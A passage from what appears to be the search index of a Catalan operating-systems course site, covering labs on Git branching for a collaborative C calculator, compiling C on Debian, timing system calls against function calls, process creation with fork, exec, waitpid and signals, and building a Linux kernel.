de la branca a la part inferior esquerra i seleccionarem Merge branch into current. \nSeleccioneu la branca a ajuntar. \nQuan integreu la segona funcionalitat (resta, multiplicaci√≥, etc.), caldr√† fer un merge ja que es detectaran conflictes. \nUn dels conflictes es el fitxer calc.c. Cada branca ha modificat aquest fitxer i caldr√† resoldre els conflictes. Acceptant els canvis de les dues branques. Podeu fer-ho manualment o amb el resolutor de conflictes de VSCode. \nRepetiu el mateix procediment per tots els conflictes que apareguin.\nUn cop resolts els conflictes, feu un commit amb el missatge @feat: Merge branch feature-resta.\n\n\n\n\n\n\n\n\n\n\nConsellNota:\n\n\n\nEn aquest punt, cada membre de l‚Äôequip haur√† de tenir implementades les seves tasques (resta, multiplicaci√≥, divisi√≥, pot√®ncia i arrels quadrades), per poder despr√©s ajuntar-les a la branca main. Es important editar els fitxers calc.c i calc.h i tamb√© el fitxer main.c per a cridar les funcions correctament.\n\n\n\n\nAjuntar les tasques\n\nUn cop totes les tasques estiguin implementades i ajuntades a la branca main, caldr√† testar que el codi funciona correctament.\nAquestes tasques estar√†n en la branca main del repositori local. Ara caldr√† pujar aquestes tasques al repositori remot.\n\nCrea a GitHub una branca remota anomenada develop-&lt;nom-usuari&gt; i la vincularem amb la branca main local. \n\nPrimer, caldr√† actualitzar les branques remotes del repositori.\ngit fetch origin\n\nUn cop actualitzades les branques remotes, caldr√† fer un push de la branca main a la branca develop-&lt;nom-usuari&gt;.\ngit push origin main:develop-&lt;nom-usuari&gt;\nUn cop pujades totes les tasques al repositori remot, el l√≠der actualitzar√† les branques remotes de tots els membres de l‚Äôequip.\ngit fetch origin\nFara un merge de totes les tasques a la seva branca main.\nFinalment, testeu que el codi funciona correctament.\nUn cop testejat, caldr√† pujar la branca main al repositori remot.\ngit push origin main\n\n\n\nDocumentaci√≥\n\nEditeu el fitxer README.md i afegiu una breu descripci√≥ del projecte, el nom dels membres de l‚Äôequip i una captura de pantalla de la calculadora en funcionament.\nAfegiu tamb√© les instruccions per a compilar i executar el projecte.\n\nPodeu consultar la documentaci√≥ de GitHub sobre com escriure aquest tipus de documents https://docs.github.com/en/github/writing-on-github/basic-writing-and-formatting-syntax.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 ¬∑ Calculadora col¬∑laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#exercici-extra-opcional",
    "href": "labs/01-introduction/lab05.html#exercici-extra-opcional",
    "title": "Laboratori 5: Calculadora col¬∑laborativa",
    "section": "Exercici Extra (opcional)",
    "text": "Exercici Extra (opcional)\nPodeu intentar superar els nivells del joc Learn Git Branching per practicar m√©s les vostres habilitats amb Git. Centreu-vos en els exercicis REMOTE.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 ¬∑ Calculadora col¬∑laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab03.html",
    "href": "labs/01-introduction/lab03.html",
    "title": "Laboratori 3: Hola m√≥n en C a Debian",
    "section": "",
    "text": "Per instal¬∑lar el llenguatge de programaci√≥ C a Debian, pots seguir aquests passos:\n\nConnecta una terminal al teu sistema Debian i obra una sessi√≥ com a usuari root.\nsu -\nInstal¬∑la el paquet build-essential, que inclou les eines i llibreries necess√†ries per compilar i construir programes en C. Aquest paquet inclou el compilador GCC, que √©s comunament utilitzat per programar en C.\napt install build-essential -y\nTorna a la sessi√≥ com a usuari normal i comprova que el compilador GCC s‚Äôha instal¬∑lat correctament.Verifica la instal¬∑laci√≥ comprovant la versi√≥ del compilador GCC instal¬∑lat.\nexit\ngcc --version\n\nAra ja pots escriure i compilar programes en C al teu sistema Debian. Com anteriorment, has vinculat VSCode amb la m√†quina virtual debianlab ara pots escriure i compilar programes en C des de l‚Äôentorn de desenvolupament VSCode.\nAnem a crear un programa senzill en C, compilar-lo i executar-lo. Aquest programa mostrar√† un missatge de benvinguda a la terminal.\n\nFer click al boto Obre la Carpeta.\n\n\n\nObre Carpeta\n\n\nSelecciona la carpeta de l‚Äôusuari. (/home/jordi). Aix√≤ obrir√† la carpeta de l‚Äôusuari a la barra lateral esquerra de VSCode.\n\n\n\nSelecciona Carpeta\n\n\n\nConfirmeu que confieu en l‚Äôorigen de la carpeta seleccionada.\n\n\n\n\nConfia en la carpeta\n\n\n\nCom a resultat, la carpeta de l‚Äôusuari s‚Äôobrir√† a la barra lateral esquerra de VSCode.\n\n\n\n\nCarpeta de l‚Äôusuari\n\n\nCrea un directori utilitzant el gestor de fitxers de VSCode. Per exemple, crea un directori anomenat hello a la carpeta de l‚Äôusuari.\n\n\n\nCrea directori\n\n\nCrear un nou fitxer anomenat hola.c dins del directori hello.\n\n\n\nCrea fitxer\n\n\nUtilitza l‚Äôeditor de text de VSCode per escriure el seg√ºent codi en C al fitxer creat.\n#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"Hola, benvingut al DebianLab!\\n\");\n    return 0;\n}\n\n\n\nEscriu codi\n\n\nPodeu seleccionar instal¬∑lar l‚Äôextensi√≥ C/C++ per a VSCode tal com us recomana l‚Äôeditor.\nUn cop instal¬∑lat, torneu a la pestanya de l‚Äôeditor de hola.c i guardeu el fitxer.\n\nüòµ‚Äçüí´ Trobleshooting:\nSi quan guardeu el fitxer, VSCode us mostra la llibreria stdio.h amb vermell indicant que no la troba, simplement, tanqueu la sessi√≥ a VSCode i torneu-la a iniciar. Aix√≤ solucionar√† el problema.\n\nSi no teniu oberta la terminal, podeu obrir-ne una des de VSCode. Feu clic a Terminal i seleccioneu Nova Terminal.\n\n\n\nTerminal oberta\n\n\nAra podeu compilar el programa des de la terminal de VSCode.\nNavega fins al directori hello.\ncd hello\nCompila el programa amb la comanda gcc.\ngcc -o hola hola.c\nExecuta el programa.\n./hola\n\n\n\n\nResum de comandes",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 3 ¬∑ Hola m√≥n en C a Debian"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html",
    "href": "labs/03-syscalls/lab02.html",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "",
    "text": "Les crides a sistema s√≥n la interf√≠cie entre els programes d‚Äôusuari i el nucli del sistema operatiu. Aquestes crides s√≥n les que permeten als programes d‚Äôusuari accedir a les funcionalitats del sistema operatiu. En aquest laboratori, analitzarem la complexitat de les crides a sistema i les compararem amb les crides a procediments.\nLes preguntes que ens fem s√≥n:",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 ¬∑ An√†lisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#objectius",
    "href": "labs/03-syscalls/lab02.html#objectius",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Objectius",
    "text": "Objectius\n\nComprendre el funcionament de les crides a sistema.\nComparar el cost d‚Äôuna crida a sistema amb el cost d‚Äôuna crida a procediment.\nDissenyar experiments en C.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 ¬∑ An√†lisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#tasca",
    "href": "labs/03-syscalls/lab02.html#tasca",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Tasca",
    "text": "Tasca\nPer respondre a les preguntes plantejades, dissenyarem un experiment en C que ens permeti mesurar el temps que triga una crida a sistema i una crida a procediment. Aquest experiment consistir√† en cridar una funci√≥ simple i una crida a sistema un nombre determinat de vegades, i mesurar el temps que triga aquestes crides. Per exemple, podem utiltizar una crida a sistema com getpid() i una funci√≥ simple com funcio() que retorna un valor constant i calcular el temps que triga aquestes crides. Com a tota experimentaci√≥, caldr√† repetir l‚Äôexperiment un nombre suficient de vegades per obtenir resultats significatius, per exemple, 1000000 vegades i calcular el temps mitj√† de cada crida.\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\n#define N_ITERATIONS 1000000\n\nint funcio() {\n    return 20;\n}\n\nint main() {\n\n    struct timespec start, end;\n    double totalTimeSysCall, totalTimeFuncCall;\n    float avgTimeSysCall, avgTimeFuncCall;\n\n    clock_gettime(CLOCK_MONOTONIC, &start);\n    for (int i = 0; i &lt; N_ITERATIONS; i++) {\n        funcio();\n    }\n    clock_gettime(CLOCK_MONOTONIC, &end);\n\n    totalTimeFuncCall = (end.tv_nsec - start.tv_nsec);\n    avgTimeFuncCall = totalTimeFuncCall / N_ITERATIONS;\n\n    printf(\"Temps mitj√† de la funci√≥: %f ns\\n\", avgTimeFuncCall);\n\n\n    clock_gettime(CLOCK_MONOTONIC, &start);\n    for (int i = 0; i &lt; N_ITERATIONS; i++) {\n        getpid();\n    }\n    clock_gettime(CLOCK_MONOTONIC, &end);\n\n    totalTimeSysCall = (end.tv_nsec - start.tv_nsec);\n    avgTimeSysCall = totalTimeSysCall / N_ITERATIONS;\n\n    printf(\"Temps mitj√† de la crida a sistema: %f ns\\n\", avgTimeSysCall);\n\n    return 0;\n}\nEn aquest codi, s‚Äôutilitza la funci√≥ clock_gettime() per mesurar el temps que triga una crida a sistema i una crida a procediment. Aquesta funci√≥ ens retorna una estructura timespec que cont√© el temps en segons i nanosegons (tv_sec o tv_nsec). Per a m√©s informaci√≥, podeu consultar el manual de linux man clock_gettime o man timespec.\nPer tal d‚Äôobtenir el temps transcorregut entre dues crides, es calcula la difer√®ncia entre el temps final i el temps inicial. Per tant, definim dues variables start i end de tipus timespec que contindran el temps abans i despr√©s de les crides. El temps total de les crides es calcula restant el temps final i el temps inicial. Finalment, es calcula el temps mitj√† de les crides dividint el temps total pel nombre de crides realitzades.\n\nNota: En aquest exemple, he simplificat el c√†lcul del temps per a facilitar la comprensi√≥ i per que cada mesura no excedira el segon. Si es vol fer una mesura m√©s universal, es recomana utilitzar la seg√ºent f√≥rmula: totalTime = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9. Ja que cada segon, la variable tv_sec incrementa en 1 i la variable tv_nsec es reinicia a 0. Aix√≤ permet mesurar temps superiors a 1 segon.\n\n\n\nNota: La variable CLOCK_MONOTONIC segons el manual de linux mesura el temps de forma mon√≤tona, √©s a dir, no es veu afectada per salts discontinus en el temps del sistema.\n\nPer executar aquest experiment, compilem el codi amb la seg√ºent comanda:\ngcc experiment.c -o experiment -o0\nAfegim l‚Äôopci√≥ -o0 per desactivar l‚Äôoptimitzaci√≥ del compilador i obtenir resultats m√©s precisos. El compilador de C, sovint optimitza el codi i aix√≤ pot afectar als resultats. Per tant, desactivem l‚Äôoptimitzaci√≥ per obtenir resultats m√©s fiables.\nUn cop compilat, executem el programa amb la seg√ºent comanda:\n./experiment\nTemps mitj√† de la funci√≥: 5.298092 ns\nTemps mitj√† de la crida a sistema: 142.388794 ns\nCom a resultat de l‚Äôexperiment, es mostrar√† el temps mitj√† de la crida a sistema √©s molt m√©s gran que el temps mitj√† de la crida a procediment. Aix√≤ √©s degut a la complexitat de les crides a sistema, que involucren moltes m√©s operacions que una crida a procediment. Recordeu que les crides a sistema impliquen accedir al mode kernel, canviar de context, executar la crida a sistema i tornar al mode d‚Äôusuari, mentre que una crida a procediment √©s simplement una crida a una funci√≥.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 ¬∑ An√†lisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#exercicis-opcionals",
    "href": "labs/03-syscalls/lab02.html#exercicis-opcionals",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Exercicis opcionals",
    "text": "Exercicis opcionals\n\nOptimitza l‚Äôexperiment per evitar repeticions de codi.\nOptimitza la mesura del temps per obtenir resultats m√©s generals aplicant la f√≥rmula recomanada.\nModifica aquest experiment per comparar altres funcions i crides a sistema.\nCrea un makefile per compilar el codi de forma m√©s eficient.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 ¬∑ An√†lisi de crides a sistema"
    ]
  },
  {
    "objectID": "notes/03-process.html",
    "href": "notes/03-process.html",
    "title": "Creaci√≥ i gesti√≥ de processos",
    "section": "",
    "text": "En aquests apunts veurem un exemple en C al user space de com es creen i gestionen processos amb fork(), com s‚Äôexecuten nous programes amb exec() i com es pot esperar que un proc√©s fill acabi amb wait().\nA m√©s, aprendrem a utilitzar senyals per sincronitzar processos..",
    "crumbs": [
      "Apunts",
      "Unitat 03 ¬∑ Gesti√≥ de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#enunciat",
    "href": "notes/03-process.html#enunciat",
    "title": "Creaci√≥ i gesti√≥ de processos",
    "section": "Enunciat",
    "text": "Enunciat\nVolem implementar un programa en C que permeti generar bitllets de loteria de forma concurrent.\nEl programa principal (pare) ha de generar 5 processos fills que s‚Äôencarregaran de generar els n√∫meros del bitllet.\nCada proc√©s fill: - genera un n√∫mero aleatori entre 0 i 9,\n- el retorna al pare com a codi de sortida (exit(status)).\nEl proc√©s pare: - espera tots els fills (waitpid()),\n- recull els n√∫meros i construeix el bitllet de loteria (un nombre de 5 d√≠gits).\n\n\n\n\n\n %%| echo: false\n\nsequenceDiagram\n    autonumber\n    participant P as Pare\n    participant F1 as Fill 1\n    participant F2 as Fill 2\n    participant F3 as Fill 3\n    participant F4 as Fill 4\n    participant F5 as Fill 5\n\n    P-&gt;&gt;F1: fork()\n    P-&gt;&gt;F2: fork()\n    P-&gt;&gt;F3: fork()\n    P-&gt;&gt;F4: fork()\n    P-&gt;&gt;F5: fork()\n\n    F1--&gt;&gt;F1: genera num1\n    F2--&gt;&gt;F2: genera num2\n    F3--&gt;&gt;F3: genera num3\n    F4--&gt;&gt;F4: genera num4\n    F5--&gt;&gt;F5: genera num5\n\n    F1--&gt;&gt;P: exit(num1)\n    F2--&gt;&gt;P: exit(num2)\n    F3--&gt;&gt;P: exit(num3)\n    F4--&gt;&gt;P: exit(num4)\n    F5--&gt;&gt;P: exit(num5)\n\n    P-&gt;&gt;P: waitpid() i recull num1, num2, num3, num4, num5\n    P-&gt;&gt;P: construir bitllet i mostrar\n    P-&gt;&gt;P: exit()",
    "crumbs": [
      "Apunts",
      "Unitat 03 ¬∑ Gesti√≥ de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#soluci√≥-b√†sica",
    "href": "notes/03-process.html#soluci√≥-b√†sica",
    "title": "Creaci√≥ i gesti√≥ de processos",
    "section": "Soluci√≥ b√†sica",
    "text": "Soluci√≥ b√†sica\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\n#define NUM_FILLS 5\n\nint main() {\n    pid_t pid;\n    int i, status;\n    int bitllet = 0;\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            srand(time(NULL) ^ getpid());\n            int num = rand() % 10;\n            printf(\"Fill PID %d genera %d\\n\", getpid(), num);\n            exit(num);\n        }\n    }\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(-1, &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet final del pare: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 ¬∑ Gesti√≥ de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#√∫s-de-exec-separaci√≥-de-responsabilitats",
    "href": "notes/03-process.html#√∫s-de-exec-separaci√≥-de-responsabilitats",
    "title": "Creaci√≥ i gesti√≥ de processos",
    "section": "√ös de exec(): separaci√≥ de responsabilitats",
    "text": "√ös de exec(): separaci√≥ de responsabilitats\nAra volem que cada fill executi un programa separat (generador) que genera el n√∫mero aleatori. De forma que el proc√©s fill nom√©s s‚Äôencarrega de crear un nou proc√©s amb exec() i el programa generador s‚Äôencarrega de generar el n√∫mero aleatori i finalitzar amb exit(num).\nEl codi del programa generador seria:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    srand(time(NULL) ^ getpid()); \n    int num = rand() % 10; \n    exit(num);\n}\nEl codi del proc√©s main (pare) es modificaria per utilitzar exec():\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\n#define NUM_FILLS 5\n\nint main() {\n    pid_t pid;\n    int i, status;\n    int bitllet = 0;\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            execl(\"./generador\", \"generador\", NULL);\n            perror(\"execl error\"); \n            exit(1);\n        }\n    }\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(-1, &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet de loteria del pare: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 ¬∑ Gesti√≥ de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#sincronitzaci√≥-amb-senyals",
    "href": "notes/03-process.html#sincronitzaci√≥-amb-senyals",
    "title": "Creaci√≥ i gesti√≥ de processos",
    "section": "Sincronitzaci√≥ amb senyals",
    "text": "Sincronitzaci√≥ amb senyals\nAra volem que el fill no generi el n√∫mero fins que el pare li doni perm√≠s.\n\nQuan un fill s‚Äôinicia, envia un senyal SIGUSR2 al pare per indicar-li ja estic preparat per generar el n√∫mero.\nEl para, en rebre aquest senyal, envia un senyal SIGUSR1 al fill per indicar-li que ja pot generar el n√∫mero.\nEl fill quan rep el senyal SIGUSR1, genera el n√∫mero i finalitza amb exit(num).\n\n\n\n\n\n\n %%| echo: false\n sequenceDiagram\n    autonumber\n    participant P as Pare\n    participant F as Fill\n\n    P-&gt;&gt;F: fork()\n    F-&gt;&gt;P: SIGUSR2 ¬∑ estic llest\n    P-&gt;&gt;F: SIGUSR1 ¬∑ ja pots generar\n    F-&gt;&gt;F: Genera n√∫mero\n    F-&gt;&gt;P: exit(num)\n    P-&gt;&gt;P: waitpid() recull resultat\n\n\n\n\n\n\nEl nou codi de generador_senyal seria:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;time.h&gt;\n\nvoid generate_number() {\n    srand(time(NULL) ^ getpid());\n    int num = rand() % 10;\n    printf(\"Fill PID %d genera %d\\n\", getpid(), num);\n    exit(num);\n}\n\nvoid handler(int sig) {\n    if (sig == SIGUSR1) generate_number();\n}\n\nint main() {\n    signal(SIGUSR1, handler);\n\n    kill(getppid(), SIGUSR2);\n\n    while (1) pause();\n}\nEl codi del proc√©s pare es modificaria per gestionar les senyals:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;signal.h&gt;\n\n#define NUM_FILLS 5\n\nvolatile sig_atomic_t ready_fills = 0;\n\nvoid sigusr2_handler(int sig) {\n    ready_fills++;\n}\n\nint main() {\n    pid_t pid;\n    int status;\n    int bitllet = 0;\n\n    signal(SIGUSR2, sigusr2_handler);\n\n    pid_t fills[NUM_FILLS];\n\n    for (int i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            execl(\"./generador_senyal\", \"generador_senyal\", NULL);\n            perror(\"execl error\");\n            exit(1);\n        } else {\n            fills[i] = pid;\n            while (ready_fills &lt;= i) pause();  // Espera que el fill estigui llest\n            kill(pid, SIGUSR1);                // Envia perm√≠s al fill\n        }\n    }\n\n    for (int i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(fills[i], &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet de loteria final: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 ¬∑ Gesti√≥ de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html",
    "href": "activities/unit01/01-kernel.html",
    "title": "Compilant el Kernel de Linux",
    "section": "",
    "text": "En aquest exercici, compilarem el kernel de Linux. La compilaci√≥ del kernel √©s un proc√©s complex i tedios. La compilaci√≥ del kernel √©s un proc√©s que implica la creaci√≥ d‚Äôun nou kernel personalitzat a partir dels sources del kernel de Linux.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#requeriments-previs",
    "href": "activities/unit01/01-kernel.html#requeriments-previs",
    "title": "Compilant el Kernel de Linux",
    "section": "Requeriments previs",
    "text": "Requeriments previs\nEn primer lloc, accedirem a una sessi√≥ com a usuari root per poder instal¬∑lar tots els paquets que necessitarem per realitzar el laboratori.\nsu -\napt update && apt upgrade -y \n\nInstal¬∑la les eines essencials per a la construcci√≥ de programar:\napt install build-essential libncurses-dev bison flex kmod bc -y\nInstal¬∑la utilitats per a l‚Äô√∫s de l‚Äôalgoritme de compressi√≥ XZ i el desenvolupament amb SSL:\napt install xz-utils libssl-dev  -y\nManipulaci√≥ de fitxers ELF:\napt install libelf-dev dwarves -y\nInstal¬∑la les cap√ßaleres del nucli de Linux corresponents a la versi√≥ actual del teu sistema (obtinguda amb uname -r):\napt install linux-headers-$(uname -r) -y \n\nFinalment tornem a una sessi√≥ d‚Äôusuari normal:\nexit\nCom a usuari normal, reviseu quin √©s la versi√≥ del kernel actual:\nuname -r\nEn el meu cas √©s 6.1.0-39-arm64.\n\nNota:\nUs recomano en aquest punt fer un clon de la vostra m√†quina virtual per si es produeix algun error durant la compilaci√≥ del kernel.\n\nA m√©s a m√©s, a la m√†quina clonada, us recomano que li adjunteu un nou disc virtual de 60 GB per poder compilar el kernel i no quedar-vos sense espai en disc. Un cop adjuntat el nou disc, podeu seguir els passos seg√ºents per muntar-lo i comprovar que s‚Äôha afegit correctament.\nlsblk\nNAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nsr0          11:0    1 526,3M  0 rom\nnvme0n1     259:0    0    20G  0 disk\n‚îú‚îÄnvme0n1p1 259:1    0   512M  0 part /boot/efi\n‚îú‚îÄnvme0n1p2 259:2    0  18,5G  0 part /\n‚îî‚îÄnvme0n1p3 259:3    0   976M  0 part [SWAP]\nnvme0n2     259:4    0    60G  0 disk \nPer obtenir l‚Äôetiquesta del disc nou que heu afegit. En el meu cas √©s nvme0n2. En el vostre cas pot ser diferent i pot ser sdb, vdc, etc. Un cop tingueu l‚Äôetiqueta del disc nou, podeu formatar-lo i muntar-lo. Assegureu-vos que √©s de 60 GB.\n# Com a root\nmkfs.ext4 /dev/nvme0n2\nmount /dev/nvme0n2 /mnt\nQuan us baixeu els sources del kernel, feu-ho a la carpeta /mnt que √©s on teniu el disc nou muntat.\ncd /mnt",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#obtenci√≥-dun-kernel",
    "href": "activities/unit01/01-kernel.html#obtenci√≥-dun-kernel",
    "title": "Compilant el Kernel de Linux",
    "section": "Obtenci√≥ d‚Äôun kernel",
    "text": "Obtenci√≥ d‚Äôun kernel\nBaixeu una versi√≥ del nucli 6.11.1 de kernel.org i descomprimiu els sources a la vostra m√†quina virtual. Podeu baixar els fitxers directament a /mnt.\nwget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.11.1.tar.xz\ntar -xJf linux-6.11.1.tar.xz\ncd linux-6.11.1/",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#configuraci√≥-del-kernel",
    "href": "activities/unit01/01-kernel.html#configuraci√≥-del-kernel",
    "title": "Compilant el Kernel de Linux",
    "section": "Configuraci√≥ del Kernel",
    "text": "Configuraci√≥ del Kernel\nLa configuraci√≥ del kernel √©s un pas crucial en el proc√©s de compilaci√≥, ja que permet personalitzar el kernel segons les necessitats i requeriments espec√≠fics del sistema en qu√® s‚Äôimplementar√†. Aquesta personalitzaci√≥ pot incloure adaptar el kernel per garantir la compatibilitat amb el maquinari disponible i afegir funcionalitats espec√≠fiques que l‚Äôusuari desitja integrar. Per exemple, es pot afegir el sistema de fitxer avan√ßats com zfs o btrfs. Un usuari avan√ßat es pot fer un kernel a mida per optimitzar el rendiment del sistema.\nAra b√©, en aquest laboratori, per configurar el kernel, partirem de la configuraci√≥ actual del vostre sistema :\ncp -v /boot/config-$(uname -r) .config\nA continuaci√≥, pots fer ajustos de configuraci√≥, en el nostre cas no farem cap canvi, √∫nicament guardarem la configuraci√≥ actual. Per realitzar la comanda seg√ºent heu de ser root i estar al directori on heu descomprimit els sources del kernel.\nmake menuconfig\nEn aquest punt, accedirem a una interf√≠cie gr√†fica per configurar el kernel. Aquesta interf√≠cie ens permetr√† seleccionar les opcions de configuraci√≥ del kernel. Si no voleu fer cap canvi, podeu sortir de l‚Äôinterf√≠cie sense guardar cap canvi. Si voleu fer canvis, podeu fer-ho i desar la configuraci√≥.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#edici√≥-de-.config",
    "href": "activities/unit01/01-kernel.html#edici√≥-de-.config",
    "title": "Compilant el Kernel de Linux",
    "section": "Edici√≥ de .config",
    "text": "Edici√≥ de .config\nUtilitzeu un editor de text per editar el fitxer de configuraci√≥ del kernel. Cerca la configuraci√≥ CONFIG_SYSTEM_TRUSTED_KEYS i assigna-li el valor de cadena buida. Si ja t√© aquest valor assignat a la cadena buida, no cal fer cap canvi.\nvi .config\n# Premeu / i despr√©s escriviu el patr√≥ a cercar\n# Cerca: CONFIG_SYSTEM_TRUSTED_KEYS\n# Edita: CONFIG_SYSTEM_TRUSTED_KEYS=\"\"\n# Desa i surt (wq!)",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#compilaci√≥-i-installaci√≥",
    "href": "activities/unit01/01-kernel.html#compilaci√≥-i-installaci√≥",
    "title": "Compilant el Kernel de Linux",
    "section": "Compilaci√≥ i Instal¬∑laci√≥",
    "text": "Compilaci√≥ i Instal¬∑laci√≥\nUtilitzarem l‚Äôeina screen que ens permetr√† deixar la compilaci√≥ en segon pla i poder fer altres tasques. No tanqueu la m√†quina virtual. La shell o el visual code els podeu tancar. Deixeu el proc√©s overnight i al mat√≠ podreu veure el resultat.\nsu -c \"apt install screen -y\"\nscreen -S compilantKernel\nUtilitzarem l‚Äôeina make per compilar el kernel. Aquesta eina ens permet compilar de forma paral¬∑lela. El nombre de processos que es poden executar de forma paral¬∑lela es pot especificar amb l‚Äôopci√≥ -j. En el nostre cas, utilitzarem el nombre de processadors disponibles a la nostra m√†quina virtual obtinguts amb nproc.\n\nNota:\nAbans d‚Äôexecutar la comanda, intenteu parar la m√†quina virtual i assignar-li el m√†xim nombre de processadors que pugueu. Aix√≤ accelerar√† el proc√©s de compilaci√≥.\n\nmake  ARCH=x86_64 -j `nproc` && make ARCH=x86_64 modules_install -j `nproc` && make ARCH=x86_64 install -j `nproc`\n# enter\n# Aix√≤ pot trigar... paciencia ^^\n\nNota:\nSi utilitzeu una m√†quina f√≠sica amb ARM, com un MAC M, heu de canviar l‚Äôarquitectura a arm64 en l‚Äôopci√≥ ARCH.\n\nPer sortir de la sessi√≥ de screen i poder realitzar altres tasques a la m√†quina virtual:\n# Premeu Ctrl+A i despr√©s d\n\nPer tornar a la sessi√≥ de screen:\n\nscreen -r compilantKernel\nUn cop finalitzada la compilaci√≥, actualitzarem el grub per poder seleccionar el nou kernel que hem compilat.\nreboot\nUn cop arranqui la m√†quina virtual, podreu seleccionar el nou kernel a les opcions avan√ßades del grub. En aquest punt, podeu seleccionar la versi√≥ del kernel que voleu carregar.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit02/01-create.html",
    "href": "activities/unit02/01-create.html",
    "title": "Exercicis de Creaci√≥ de processos en C",
    "section": "",
